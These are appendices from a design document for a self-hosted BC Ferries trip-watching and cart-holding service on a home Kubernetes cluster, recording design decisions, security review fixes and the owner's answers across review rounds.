| D16 | W0 de-risk spikes (local and cluster only; no live booking spikes), then M1 owner on the new stack, M2 invitees in two stages (household, then wider; the old M3 merged in, round 3), M4 hardening backlog (including the optional sandbox). M5 removed. | Each technical unknown decides a design branch before code depends on it; what we don't know about BC Ferries' guest checkout is learned from real use and production detection behind reversible defaults (owner, round 2). Controls that back up RBAC land just before non-household invitees. |
| D17 | **Round 3:** the poll model. Each user's nearest eligible trip within 7 days gets the warm browser (automatic, nearest first; `maxActiveBrowsers` default 1), checked on a curve (5 min from 7 days out, 2 min from 3 days, 60 s from 24 h, 30 s from 6 h; ±15 % jitter; 30 s floor). Every other trip gets a short check every 6 h from a pod that checks once and exits, unless it carts, then it stays for checkout; short-check pods count against cluster capacity and the start throttle, not `maxActiveBrowsers`, with one slot kept for them. One hold per user through cart claims. Trips at most 30 days ahead. Quiet hours 23:00-06:00 Pacific: normal polling, alert only (since 0.6.3, each user's own quiet hours, none by default, in which their trips aren't checked). Canonical numbers in `src/ferry_watch/polling.py`. | The owner's "be good users of the api": the fleet makes typically 2-5 checks/min and about 14 at worst, against 12/min for the owner alone today. It replaces the "Pause X to watch this one" choice and the 30-day Dormant window with something automatic. |
| D18 | **Round 3:** hold egress. The FQDN allowlist always; a second CiliumNetworkPolicy adds public TCP 443 and any DNS name for pods labelled `ferry-watch.io/egress: hold`, which ferry-control sets at READY and clears at hold end; the pod-lock VAP (now in M1) lets ferry-control change that label and nothing else. Private, cluster, node, metadata, smtp-relay and observability destinations stay denied. Fallback: public HTTPS always. | Any bank's 3DS works without a learned list (S-3DS gone). Keeping the allowlist outside holds keeps an exploited, merely watching pod off the open internet for nearly all of its life, for about 2 days of work (§7.6). |

## Appendix B: Conflicts resolved

1. **Base design.** ops-scale-fairness (aligned with the cluster facts, top-two for both judges), cut to lean's
   scope.
2. **Two or three control processes.** The draft chose three (web, hub, fleet). **Review: two** (web; control
   = hub + fleet). The hub must stay out of the internet-facing process (it parses hostile pod input, and web
   holds the ticket and VAPID keys); splitting hub from fleet bought little for four cross-process protocols.
3. **Per-process DB roles.** Delivery review proposed one role and dropping RLS and the trigger; the security
   review kept them. **Kept, reduced to two login roles** created by CNPG managed roles, so no app code needs
   CREATEROLE or the superuser. The outbox RLS is kept for attribution, with its limit stated.
4. **Token TTL and re-review.** 600 s; checked at connect; the 5-minute re-review and `reauth` are dropped.
5. **VNC authorisation.** Ticket plus `FW_OWNER` plus a first-viewer lock now. An IdP principal verified by the
   pod (S-VNCID) moves to M4; R3 is accepted for invite-only (owner, round 3). Header-based principal binding is rejected
   (unprovable at the pod).
6. **Ticket transport.** Delivery review proposed the stock client with the ticket and nonce in the query
   string. **Stock client adopted; query string rejected**: Envoy's default access log records the path and
   query, and `N` stays valid for the whole hold, so a log reader could rejoin. A WebSocket shim keeps both in
   the subprotocol header without patching the bundle.
7. **Xvnc `-MaxConnectionTime`.** 6000 s, beyond the compiled hold. `-MaxIdleTime`, `-MaxDisconnectionTime`,
   `-IdleTimeout` and `-DLP_KeyRateLimit` are not used.
8. **preStop hook or SIGTERM drain.** SIGTERM drain, no hooks.
9. **Anchor and hold PDBs.** The draft kept both. **Review: neither in v1.** talosctl drains bare pods with
   `Force`, so the anchor is unnecessary; a hold PDB fails the upgrade after 5 minutes instead of delaying it.
   Hold PDBs with a `drainTimeout` are an M4 option.
10. **Per-pod routes or a static router.** Static vnc-edge.
11. **Standby tier and AIMD.** AIMD stays M4, behind data. Round 3's short checks are the cold tier.
12. **User id.** Deterministic `hash(provider, subject)` with GitOps aliases (round 2: `hash(iss, sub)`).
13. **PriorityClass value.** 0 with `preemptionPolicy: Never`.
14. **Namespace-per-tenant.** Rejected for v1 (D3).
15. **Go controller and CRDs.** Rejected (D2, D4).
16. **Egress forward proxy.** M4 (for R13), or M2 if S-CIL fails.
17. **Pushover bring-your-own.** Removed for users.
18. **Credential-page fallback.** Rejected; alert-only. The pre-cart window was declined for v1 and is never
    an automatic fallback (first-list Q1, round 2); it needs an explicit owner decision (§15).
19. **Cookie on the dashboard host.** The draft used a Lua filter. **Review: trusted headers let the route drop
    the whole Cookie header after ext-auth**; Lua is off by default and gateway-wide. **Round 2:** with OIDC,
    the app sets no cookie (a bearer session), so the route still drops the whole Cookie header.
20. **Cross-tenant dedupe.** Rejected (integrity channel for A3).
21. **Default trip limits.** **3 stored, 1 watched at once** (owner decision during review), replacing the
    draft's 4 and 3. With one active browser per user, cross-pod hold coordination and `maxConcurrentHolds`
    went; round 3's short-check pods can cart too, so one hold per user returns as a cart claim (C32).
22. **Ticket hand-off.** A client-generated nonce registered on first connect gives the "only the first device
    can reconnect" guarantee with no pod HTTP endpoint and no stream change.
23. **Identity.** The draft chose app-native OIDC; the completeness review showed decision 7 was overridden on
    a wrong inference, so the review moved to **trusted headers via Authelia ext-auth**, with Q0. **Round 2:**
    the owner answered (old) Q0 with "Can we use oidc?", so identity is **app-native OIDC with a cookie-less app
    session** (§6.2), which keeps the review's cookie result without Lua or a new domain.
24. **Lost-device recovery versus C11.** The product review proposed a takeover ticket; the security review
    kept C11 intact. **C11 kept**; the device chooser and nonce reuse reduce the risk; no takeover ticket
    (owner, round 3), even if the iOS path loses the nonce.
25. **VNC minutes per day.** The product review proposed dropping it; the delivery review listed it in the
    minimum v1. **Kept, enforced only before carting**, never closing an open session.
26. **Termination message.** The completeness review proposed a masked last-error summary there; the security
    review asked for fixed enums only. **Enums only** (reason and error class); post-mortem uses retained pods.
27. **Second-fence VAPs.** The delivery review proposed one VAP; the security review kept the allowlist VAP
    approach. **One VAP in M1; the lock and namespace-objects VAPs in M3**, before non-household invitees, with
    `apps/*` and `batch/*` added. **Round 3:** the lock VAP moved to M1, because ferry-control's egress-label
    patch depends on it, and the namespace-objects VAP to M2, when M3 was merged into it.
28. **Kind with Cilium and EG in CI.** Dropped for compose plus kind-lite plus the real-cluster smoke; kind
    cannot reproduce the behaviours that matter.

## Appendix C: Must-fix traceability (from the judges' reviews of the four designs)

| Must-fix (judge) | Where addressed |
|---|---|
| Authelia cookie reaches every chestr.dev backend (A) | C16, §6.2.3 (the app sets no cookie; the route drops every Cookie header), S-OIDC, the echo check in §11.4, R12 |
| Pods serve the KasmVNC client (A) | C14, §7.9 (vnc-edge serves the client; pods only do `/ws`) |
| Loopback Xvnc reachable by page JS (A, B) | C13 (unix socket only), §5.6 self-tests 2-3, LNA policy, S-KIOSK |
| Bearer ticket, undefined reconnect (A) | §5.5: `sub == FW_OWNER`, nonce lock with atomic set and preemption, no URL reuse; R3 accepted and no takeover (round 3) |
| Hub inside the internet-facing process (A) | D1: the hub endpoint lives in `ferry-control`, not `ferry-web` |
| Kernel args and `--no-sandbox` (A) | R2 (explained in plain terms, including what a chained kernel or parser bug reaches); S-SBX (seccomp profile + sysctl) recommended as optional hardening, not a gate, pending the owner (Q1) |
| SNAT makes NetworkPolicy unprovable (A, B) | §2.2, C6, cryptographic gate, vnc-edge hop, S-CIL decides entity rules |
| Hold-cap clock starts when the operator first sees it (A) | §3.6 step 2: `hold_ready_at` at ack; compiled 90-min cap; `-MaxConnectionTime` |
| VAP `system:` exemption (A) | §7.5 `fw-browser-pod-lock` (named exemptions, positives in kind-lite), M1 since round 3 |
| Credential-page fallback (A, B) | §5.7: alert-only; no pre-cart window in v1 (first-list Q1, round 2) |
| One DB role for every process (A) | §6.4 two login roles via CNPG managed roles, RLS, trigger; S-DB |
| Authelia client restrictions before outsiders (A) | §6.2.9, §2.3, M2 hard gate (kept in round 3; the ferry client itself is `one_factor`) |
| Tickets in URLs reach logs (A, B) | C15 fragment plus subprotocol via shim; nginx `noargs`; Appendix B #6 |
| `empty_cart` unverified; guest checkout unverified (A) | §5.2: the landing-URL check now, the empty-cart check from the M1 fixtures, every release counted by check level. Guest checkout assumed (owner, round 2: no spike), with production detection, the alert-only switch and two-way doors (§5.7). |
| Align with cluster facts (B) | §2.2 |
| No pre-cart VNC as a fallback (B) | §5.7: not in v1 and never automatic; only by an explicit owner decision (§15) |
| Shutdown loses carts (B) | §5.1 supervisor, `tini --`, verified drain |
| Pod template and VAP written together (B) | §7.4-7.5, §11.4 leak matrix, §11.5 |
| Policies in three directories; never RemoteDebugging or DevTools policies (B) | §5.6; image smoke test |
| `toFQDNs` never used here (B) | S-CIL, `nameError`, `toCIDRSet` fallback, post-deploy smoke |
| Home-cluster integration list (B) | §7.10; M1 PR |
| Capacity from measurement (B) | S-MEM, §8.4 |
| Double bookings and runaway holds (B) | C18, C22, §3.6 steps 7-9, "0 = forever" removed |
| State residuals honestly (B) | §4.6 |
| 16-hex trip ids (B) | §6.4 |

## Appendix D: Changes from review

Rows 1-35 record the review of the draft and use the question numbers of that time (Q0-Q16, the "first
list"); rows 36-60 use the round-2 numbers (Q1-Q12); §14.1 maps both. Rows 36-47 record the owner's round-2
answers. Rows 48-60 record the fixes from three independent reviews of the round-2 revision (consistency,
OIDC security, one-way doors). Rows 61-75 record the owner's round-3 answers. Each row describes the plan as
it stood then; a later row supersedes an earlier one (for example, row 63 replaces the 3DS allowlist and
S-3DS of rows 19, 39 and 48, and row 62 the 20-minute auto-resume of row 17).

| # | Change | Why (reviewer) |
|---|---|---|
| 1 | Identity moved to Authelia ext-auth plus trusted headers on the dashboard route; §6.2 rewritten with both options, a recommendation, Q0 and an IdP replacement runbook. | Owner decision 7 had been overridden on a wrong inference (completeness); Lua is off by default and gateway-wide (cluster). |
| 2 | "The operator" defined early (§1) with what it can and cannot do; a "who can see each secret" table (§4.3) that names Cloudflare. | Owner message 1 wording; R4 omitted the tunnel (completeness). |
| 3 | `maxActiveBrowsers` default 1, `maxTrips` 3; 409 names the trip to pause; cross-pod hold coordination removed; per-user routing box (§3.3). | Owner decision during review (delivery). |
| 4 | Anchor ConfigMap, hold PDBs, `fw-anchor-guard`, `fw-hold-pdb`, C28 and the never-evict fallback removed; Talos drain behaviour and runbook in §7.8; M4 option with `drainTimeout`. | talosctl drains bare pods and fails upgrades after 5 min (cluster, delivery). |
| 5 | Cilium `nameError` plus fully qualified names with trailing dots; S-CIL tests both resolvers. | REFUSED stops glibc's search list; the short hub name never resolved (cluster, blocker). |
| 6 | Sandbox plan uses a Localhost seccomp profile from the start, plus the sysctl; Q4 asks for both. | containerd's RuntimeDefault blocks `CLONE_NEWUSER` without CAP_SYS_ADMIN (cluster, delivery). |
| 7 | Hub and fleet merged into `ferry-control`; two DB login roles via CNPG managed roles; superuser only in the stock `postgres-init` Job; migrations in a separate owner-role Job; R14 and Q14. | Delivery (scope); security (superuser in the namespace; keep per-role DB separation). |
| 8 | Xvnc on a unix socket only; TCP plus BasicAuth becomes the fallback. | KasmVNC BasicAuth on `/websockify` was unverified; the unix socket closes the page-JS path by construction (security). |
| 9 | vnc-edge stated as fully inside the VNC confidentiality and integrity boundary; C11 scoped to ferry-web; atomic lock check-and-set. | Security. |
| 10 | Idea 7, D12 and C18 reworded; R13 added for A3 bypassing the IP budget. | Security. |
| 11 | `-DLP_KeyRateLimit` and `-IdleTimeout` removed; gate pings every 20 s; reconnect with `N` replaces stale sockets; only failed upgrades rate-limited; shim reload until the deadline. | Dropped keystrokes; refused reconnects after bank-app switches; Cloudflare idle (product, cluster). |
| 12 | `/c/<trip>` is a device chooser with no automatic POST; nonce reused per `(trip, gen)`; Q5b for takeover; C11 kept. | Lost or wrong device lost the cart (product); keep C11 (security). |
| 13 | Payment guard; session default from S2b timing (30 min); no navigation away while paying; session deadline shown. One-time extension deferred to M4. | Checkout cut off mid-payment (product). |
| 14 | S6 extended (TTL, extension, expired-cart look); cart liveness checks; `cart_expired{by_site}` never counts as viewed. | Holds outliving the site's cart (product). |
| 15 | Interval default and floor 30 s (the budget stretches it); opening-visibility metric. | 60 s floor halved detection (product). |
| 16 | Inactivity pause removed. | It paused the intended use (product). |
| 17 | Booking detection (`outcome=booked`); "Did you book it?" auto-resumes after 20 min; slot reserved 30 min; email answer links. | Unanswered prompts silently stopped watching (product). |
| 18 | `alerted` versus `offered` alert memory. | Limit-suppressed departures were never carted (product). |
| 19 | S-3DS multi-issuer run gates non-household invitees; blocked-host detector in v1 (agent-side); "Release and book it myself"; Q13. | 3DS hosts differ by issuer (cluster, product, delivery). |
| 20 | SES deliverability per invitee is a hard prerequisite; push-only fallback deleted; invite runbook and `invited` email; Q11, Q16. | Authelia 2FA enrolment needs email (product, completeness). |
| 21 | Memory sizing uses the cgroup working set including tmpfs; Chromium disk cache capped; podMemory starts at 1.5 GiB; one capacity table (§8.4); quota computed from values. | tmpfs counts against the limit; numbers disagreed (cluster, completeness). |
| 22 | "Guaranteed QoS" claims removed; CPU quota computed. | Pods are Burstable; the fixed CPU quota capped the fleet (cluster). |
| 23 | Stock KasmVNC client, unpatched, with a shim and a build-computed CSP (`wasm-unsafe-eval`, explicit `wss:`). | Patching a minified bundle per release (delivery); CSP would break the client (delivery). |
| 24 | One VAP in M1; lock and namespace-objects VAPs in M3 with `apps/*`, `batch/*`; `can-i` negatives for workload controllers. | Delivery (scope); security (incomplete deny list). |
| 25 | CI: compose integration and kind-lite replace kind with Cilium and EG; positives for kubelet/GC moved out of envtest; egress matrix is a post-deploy gate; skew job from the first protocol change. | Kind can't prove Cilium behaviour; envtest has no kubelet (cluster, delivery). |
| 26 | Self-hosted runner named in R1 and made a hard gate (Q15). | Cluster-admin runner on PR workflows (cluster). |
| 27 | Termination message limited to enums (C30); failed pods that never held or viewed retained 30 min; Grafana dashboard; local reproduction documented. | Pod-to-operator channel (security); post-mortem gap (completeness). |
| 28 | Warmer DaemonSet and ClusterSecretStore conditions dropped. | Warmer didn't keep the image (security); conditions over-built (cluster). |
| 29 | M1 uses `ferry-next.chestr.dev`; `routes.enabled`; gatus disabled on the dashboard route, with a forged-header canary instead. | Host collision before cutover; gatus probes (cluster). |
| 30 | Cutover and rollback runbook; legacy app kept at zero replicas until the soak ends; only the reference to `pushover` removed; BC Ferries fields deleted afterwards. | No rollback; shared `pushover` item (completeness, delivery). |
| 31 | Owner's loss of logged-in checkout stated (Q3b); S1/S2/S7 against the owner's trips. | Completeness. |
| 32 | Effort re-baselined bottom-up (91-113 focused days); explicit minimum-secure-v1 cut line; M2 exit criteria use fake-bcferries for restart and drain tests. | Delivery, completeness. |
| 33 | Deferred to M4: QR handoff, S-VNCID (with the corrected header path), breaker canaries, Trips/Settings/Audit pages and policy table, request-access, aliases CLI, cosign/SBOM, the 5-minute TokenReview re-review. | Delivery (none weakens an owner-requested guarantee). |
| 34 | Quiet hours, specific queue badges, alert copy with route, date and absolute deadline, Focus onboarding, Powell River–Comox note, control-ack gate on carting, delete-my-data, restore runbook, dev loop. | Product and completeness minors. |
| 34b | `maxVncSessionsTotal` dropped (bounded by `maxBrowsersTotal`); `vncMinutesPerDay` kept but enforced only before carting. | Product, delivery. |
| 35 | Code references fixed (`watcher.py:54`, `:72`, `:112`, `:124`, `:128`, `:130`, `:529-535` split); identity middleware placed inside `error_middleware`; Xvnc flags keep `:99`, `-geometry`, `-depth 24`; cross-references and undefined ids (the draft's "R14", S3, S4) fixed; "Booked it?" inserted by ferry-control. | Completeness. |

### Owner answers, round 2

The owner's words: "We can leave as guest checkout for now I guess. Users can always sign-in on the browser?
2. Can we use oidc ? 3. I don't understand this limitation why is it needed. 4. No 5. No spike for now, assume
it works and if not we will adjust later, don't make any one way door decisions on this." Mapping, as
recorded in [decisions.md](decisions.md), in the old numbering: (1) Q3/Q3b, (2) Q0, (3) Q4, (4) Q1, (5) Q2.

| # | Change | Why (owner answer) |
|---|---|---|
| 36 | Identity is app-native OIDC: ferry-web is a confidential OIDC client of Authelia (PKCE S256, scopes `openid profile email groups`, `response_mode=fragment`, pre-configured consent 1y, `claims_policy: default`) with an `authorization_policies` entry for groups `ferry-watch` and `admin` (default deny), following the home-cluster client-secret convention. §6.2 rewritten (flow, route, home-cluster objects, re-auth, iOS, alternatives, abstraction, invitations bound at first sign-in because Authelia's `sub` is opaque). | (2) "Can we use oidc?" |
| 37 | Cookie-less app session: an opaque 256-bit bearer token in localStorage (hash stored; 7 d idle, 30 d absolute; revoked on logout, "sign out everywhere" and suspension); WebSocket first-message auth; the dashboard route has no gateway auth, removes every Cookie header and keeps `Authorization`. The ext-auth SecurityPolicy, the ReferenceGrant entry, the `access_control` rule, the gatus forged-header canary and `IdentityCanaryFailing` are removed; ferry-web gains egress to the issuer (§7.6). C15, C16 and C29 rewritten; R15 withdrawn; R17 (token readable by XSS), R18 (iOS home-screen redirect context) and R19 (unauthenticated requests reach the app) added; S-AUTH became S-OIDC; S-IOS added in M1 with a handoff-code fallback. | (2), keeping C16 without Lua or a separate domain; the old Q6 is moot. |
| 38 | Alternatives kept in §6.2.5: trusted headers via ext-auth, and Envoy Gateway's OIDC SecurityPolicy with `jwt.claimToHeaders`, both rejected because they are header trust that fails open if the gateway policy is detached; app-native OIDC fails closed and is testable without the gateway. `TrustedHeaderProvider` kept only as a LAN/dev adapter that the chart refuses to combine with the envoy-external route. | (2) |
| 39 | Guest checkout assumed, with no live spikes: S1, S2, S2b, S5, S6, S7 and the live part of S-FIX removed from W0 and the critical path; fixtures captured from the owner's real use during M1; production detection (`checkout_login_seen`, expired carts, "Did you book it?" reasons, outcome, release and duration metrics, the `guest_checkout_failing` alert); hold clocks keep 30/30/10/60 min and are tuned from telemetry; payment hosts seeded with Moneris and learned from real checkouts; S-3DS no longer completes test bookings. | (1) and (5) "No spike for now, assume it works" |
| 40 | Two-way doors listed in §5.7: the login code kept behind a disabled flag; `checkout_mode` reserved in `trips` and `configure`; the fleet-wide and per-fare/vehicle alert-only switches; the VAP's `optionalEnv` param can admit `FW_CHECKOUT_MODE`. `empty_cart` checks the landing URL now and the empty cart once fixtures exist; `bye.empty_verified` became `release_check`. | (5) "don't make any one way door decisions on this" |
| 41 | "Users can always sign-in on the browser?" answered in §5.7 (corrected in row 50): bcferries.com, including `/login`, is allowlisted, but BC Ferries has refused logins while a guest cart exists ([top-level README](../../README.md) "Things to know about BC Ferries"; `site.py:288-290`), so the plan doesn't rely on it and `/c/<trip>`, the cart banner and the invite email say so. | (1) |
| 42 | The sandbox and kernel flags explained in plain terms (R2). Changed from a gate before non-household invitees to optional hardening in the backlog (M4), the owner's call, recommended before inviting people the owner doesn't know well. Removed from §12.4, from W0 (S-SBX to the backlog), from the M3 deliverables and from the home-cluster checklist; the VAP params that can require it later stay. | (3) "I don't understand this limitation why is it needed." |
| 43 | No pre-cart sign-in window: VNC stays strictly gated to a held cart; M5 removed from the milestones and listed as a possible, reversible future option in §15. | (4) "No" |
| 44 | Milestones and effort recomputed: W0 6.5-8 days (about 1.5 weeks), M1 62-76 (OIDC +3-4, detection and fixtures +2-3), M2 unchanged, M3 6.5-10 (kept as its own audience step, reasons in §12.2), total 89-112 days ≈ 18-22.5 weeks, owner on the new stack after about 14-17. M1's exit no longer needs a booking made only to test. | Follows from 36-43 |
| 45 | Open questions: the answered ones (old Q0-Q4, Q6) listed in §14.1; the rest renumbered Q1-Q11 with their old numbers in brackets, and every in-text reference updated. | Housekeeping |
| 46 | Data model and API for the above: `invites`, `sessions`, `identities (iss, sub)`, `trips.checkout_mode`; `/auth/config`, `/auth/session`, `/auth/logout`, `/api/me/sessions`, admin invites and session revocation; the "booked" answer's `reason`. | Follows from 36-41 |
| 47 | The checkout host is `ferry-checkout.chestr.dev` instead of the earlier VNC host name everywhere (route, `FW_VNC_ORIGIN`, CSP, shim regex, links). Still a single label under `chestr.dev`, so the certificate and the tunnel rule cover it; internal names (`vnc-edge`, `FW_VNC_*`) stay. | Owner, round 2 ([decisions.md](decisions.md)) |
| 48 | The spike claims made accurate: no spike tests guest checkout and no booking is made only to test, but S-MEM reads real pages, S-DRAIN and the M1 VNC exit check briefly hold one real cart and release it, and S-3DS's walks to the 3DS step need the owner's OK (Q8). S-MEM's checkout measurement moved to M1, from the owner's real holds. | Consistency: "none holds BC Ferries inventory" was untrue. |
| 49 | The sandbox and kernel outcome relabelled as the planner's recommendation, pending the owner: Q12 added (default: accept for now; harden before inviting people the owner doesn't know well). The optional hardening costed at about 4 days (S-SBX about 1 plus about 3) everywhere. | Consistency: the owner only asked why it was needed (decisions.md records a recommendation). |
| 50 | The in-browser sign-in answer rewritten: probably not during checkout, because every VNC session has a held guest cart and BC Ferries has refused logins while one exists; whether trying affects the cart is unverified; and advised against for security too (the password would cross the R4 path into an unsandboxed Chromium, and the account session outlives the pod). New copy: "Check out as a guest. Don't sign in to BC Ferries here: it doesn't accept a sign-in while a cart is held." C1's threat narrowed to *stored* credentials; R4 and the secrets table name the typed-password case; blocking `/login` documented as a one-line option. | Consistency (the answer didn't follow from the evidence); OIDC security (it invited a password into the VNC path and conflicted with §15's "sandbox first"). |
| 51 | `checkout_login_seen` gains `forced` (site redirect or account-required page vs a user-started visit) and the "I tried to sign in" reason; only forced walls and `needed_account` answers count. `guest_checkout_failing` now fires on the first one (the 2-in-7-days PrometheusRule stays). A per-hold outcome record (outcome, reason, fare, vehicle type, login seen) kept 400 days. | Consistency (voluntary sign-ins would raise false alerts); one-way doors (the signal could stay silent at household volume, and per-type evidence expired after 30 days). |
| 52 | Sessions re-verified with the IdP at least every 24 h (silent redirect, token rotated, groups re-read); R20 (IdP removal is not immediate) and a "Removing a person" runbook (suspend in the app first). | OIDC security: Authelia applies the client policy only at the authorize endpoint (`handler_oauth2_authorization_consent_core.go:35-80`), so a removed person kept access for up to 30 days. |
| 53 | R2 rewritten: the exploit window is the pod's whole life; containment holds only while ferry-control's parser and the kernel hold; every node is a control-plane node (`talos/controlplane.yaml:191`), so a kernel escape is the whole cluster; `mitigations=off` matters most once native code runs. §13's R2 row and the README follow. | OIDC security: the plain-language R2 understated the risk the owner is asked to accept. |
| 54 | Authelia's `sub` stated as per username (`internal/oidc/store.go:76-101`); R21; "never reuse an lldap username"; email-change flag. The uid is always computed (`identityAliases.get(hash(iss, sub))`), the `identities` row is only a cache, and a mismatch refuses the sign-in (C23); aliases take precedence over `bootstrapAdmins`. | OIDC security; one-way doors. |
| 55 | Dashboard WebSocket: `/api/ws` exempt from the header middleware (first-message auth mandatory), sockets bound to their session's `token_hash` and closed on its revocation or expiry, 4 KiB message cap. No automatic sign-in after an explicit sign-out (a "signed out" flag), and only `expired`/`reverify` 401s restart sign-in. | OIDC security. |
| 56 | R17 corrected: the CSP stops injection and fetch/form exfiltration, not navigation; the stolen-token window is now bounded by the 24 h re-verification. R12 states that script on the ferry host can still make same-site requests carrying the owner's `SameSite=Lax` Authelia cookie (`schema/session.go:30,89`); old Q6 is "mostly moot", not moot. Pre-auth limits keyed per client (`CF-Connecting-IP`) with a global backstop. `alg` allowlist with `none`/HS256 tests; provider binding before multi-provider; §2.3's "useless without the client secret" corrected. | OIDC security; consistency. |
| 57 | S-IOS also backgrounds the home-screen app during the Authelia steps (Mail for the enrolment code, authenticator, passkey); fallbacks: a 10-minute localStorage pending sign-in, first enrolment in Safari or on a computer, the handoff code. | OIDC security. |
| 58 | The legacy app, its PVC and `BCF_USER`/`BCF_PASS` are deleted only after 14 days **and** a real guest checkout on the new stack with no forced login wall since; the revert PR pins the legacy image by digest; an envoy-internal host is noted for running it alongside. | One-way doors: a fixed 14 days could delete the only logged-in checkout path before guest checkout was proven. |
| 59 | Pre-cart VNC moved from "out of scope" to a deferred option that needs the owner's decision ("not in v1, never an automatic fallback" replaces "under any fallback"); the attended sign-in named as the account-mode candidate; the "no redesign" claims replaced by the actual list (ticket audience, C22 branch, C17 layers with a sign-in-minutes budget, an is-logged-in probe, the sandbox first; about 1.5 weeks). Cheap now: the ticket's `aud` names its purpose, `vnc_mints.cart_id` is nullable, C22 is scoped to checkout viewers. | One-way doors; consistency. |
| 60 | Door 1 kept alive in CI (the login and back-off tests ported with the flag forced on; fake-bcferries keeps `/login` and `/my-account`). The header adapter's principal defined (`iss` from config, `sub` = `Remote-User`; one alias per user to switch); unmatched sign-ins recorded for 30 days; the dashboard route also strips `Remote-*`; separate `routes.dashboard.enabled` and `routes.checkout.enabled` flags so the LAN adapter can coexist with checkout. Minor fixes: the user-agent question reference (Q4), "Q8-Q10 and Q12 before M3" in both documents, identical minimum-secure-v1 lists, the top-level README citation. Effort: M1 63-77 days, total 90-113 (about 1 day for these fixes). | One-way doors; consistency. |

### Owner answers, round 3

The owner answered the twelve round-2 questions (Q1-Q11 and Q1b), recorded in [decisions.md](decisions.md)
"Owner answers to the remaining open questions (round 3)", and the code gained
`src/ferry_watch/polling.py`, the canonical definition of the poll numbers.

| # | Change | Why (owner answer) |
|---|---|---|
| 61 | **Poll model.** `tripHorizonDays` 30 (was 120); `startWindowDays`, the Dormant phase, `Waiting(limit)` and the 409 "Pause *X* to watch this one" on enable are gone. The user's warm browser (`maxActiveBrowsers`, default 1) goes automatically to the nearest enabled trip within 7 days and moves when a nearer one appears (never during a hold); it checks on the curve 5 min / 2 min / 60 s / 30 s by time to departure (±15 % jitter, 30 s compiled floor). Every other trip gets a short check every 6 h (up to daily) from a short-lived pod that checks once and exits, or carts and stays for checkout; short-check pods count against `maxBrowsersTotal`, the quota and the start throttle (one slot kept for them), not `maxActiveBrowsers`. `configure.mode`, `bye{short_check_done}`, `trip_runtime.next_check_at`, new badges; the per-user interval preference is gone. §3.5, §5.2-5.4, §6.6, §8.1, §8.2, §10. | Round 3 #4: "the longer away it is the less frequent we poll ... We want to be good users of the api." |
| 62 | "Did you book it?" after a viewed hold with no detected confirmation **pauses the trip until answered**; "Yes" archives, "No" resumes; the 20-minute auto-resume and the 30-minute slot reservation (`trip_runtime.reserved_until`) are removed. | Round 3 #3 |
| 63 | **Hold egress.** Public HTTPS (TCP 443, any host, any DNS name) while a cart is held, through a second CiliumNetworkPolicy keyed on `ferry-watch.io/egress: hold`, which ferry-control sets at READY and clears at hold end; ferry-control gains `pods` patch; `fw-browser-pod-lock` moves to M1 with a one-label exception; option B (public HTTPS always) documented as the fallback with its trade-off (§7.6). Chromium's URL policy allows `https://*` and leaves hosts to the network. The 3DS/payment allowlist, S-3DS and the old Q8 walks are removed; R16 rewritten (the flip failing), R22 added (browsing and code reach during holds), R5, R13, C5, C20, C21, §4.5 updated; the post-deploy smoke tests both states; S-CIL and S-TR test the flip and the UPDATE rule. | Round 3 #9 |
| 64 | **One hold per user** via `cart_claim` / `cart_claim_result` and `hold_claims` (C32), replacing "a control ack within 30 s" as the carting gate, because short-check pods can cart too. | Round 3 #4 ("one hold at a time"; a short check carts only "if the user holds no cart") |
| 65 | Quiet hours 23:00-06:00 Pacific (was 23:00-07:00, user may turn off): fleet-wide policy from `polling.py`, normal polling, alert only. | Round 3 #4 |
| 66 | Capacity (§8.4) recomputed: warm browsers = `maxBrowsersTotal` − 1 (3-22 across 8-24 GiB; 6 at the start), short checks in the spare slot. Budget (§9.3) recomputed: demand from the curve, proportional stretch only above 20/min; typically 2-5 checks/min, about 14 in the worst case (7 users within 6 h). | Follows from 61; round 3 #5 (20/min, ceiling 40) |
| 67 | The `ferry-watch` Authelia client is `one_factor`: second-factor enrolment removed from the invite journey, S-IOS and R18; SES is needed for the invitation and alerts only; the generated password is sent out of band; the other clients keep `two_factor` and still get group restrictions before anyone new joins lldap. | Round 3 #7 |
| 68 | R3 accepted for invite-only (S-VNCID stays M4); no iOS takeover ticket; the desktop UA kept; Talos-upgrade hold releases accepted with the pause-carting runbook; admins never get VNC, exec or screenshots and tenants are told about cluster-admin visibility. | Round 3 #1, #2, #5, #6, #8 |
| 69 | R14 accepted permanently: the standard `components/cnpg` stays and the database variant work is dropped. | Round 3 #10 |
| 70 | `home-cluster-runner` left as is: a residual stated to tenants (R1), no longer a hard gate, removed from M3, §2.3, §7.10 and minimum secure v1. | Round 3 #11 |
| 71 | Cloudflare geo-block unchanged; the invitation and onboarding say the service works only from Canada and the US. | Round 3 #12 |
| 72 | Milestones: the old M3 is merged into M2 (household stage, then wider stage). What stayed of it is the `fw-ns-objects` VAP and SES production access; S-3DS, the runner and the variant are gone, and the pod-lock VAP moved to M1. | Follows from 63, 69, 70 |
| 73 | Effort: W0 7-8.5, M1 66.5-81.5 (+2-2.5 poll model, +2-2.5 hold egress, −0.5 OIDC), M2 16.5-21; total 90-111 days ≈ 18-22 weeks (was 90-113); the owner on the new stack after 73.5-90 days; about 21-25 calendar weeks. | Follows from 61-72 |
| 74 | Open questions: the round-2 list is answered except the sandbox; §14 now lists Decided items and three open ones: Q1 sandbox (was Q12), Q2 Authelia's ban time (the unanswered half of Q6), Q3 outbound/return pairs (was Q3b). Every in-text reference renumbered; references to the first list are now "first-list Qn". | Housekeeping |
| 75 | The VNC/checkout host is `ferry-checkout.chestr.dev` in every place; no other host name remains. | Round 2 hostname answer, re-checked |
